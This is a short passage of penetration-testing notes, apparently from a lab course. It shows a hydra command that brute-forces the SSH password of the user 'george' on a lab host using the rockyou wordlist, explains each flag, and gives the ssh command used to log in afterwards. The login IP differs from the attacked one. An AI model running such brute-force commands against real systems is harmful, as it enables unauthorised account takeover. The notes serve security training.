`hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201

We'll attack a single username (using -l) with **-l george**, specify the port with **-s**, indicate our password list (using -P) with **-P** and define our target with **ssh://192.168.50.201**:

It's worth noting that the format of the username also suggests that the company may use the first name of the user for account names. This information may assist us in later information gathering attempts.

### Command to connect
`ssh -l george 192.168.119.201 -p 2222

`-l --> User`
`-p --> Port`
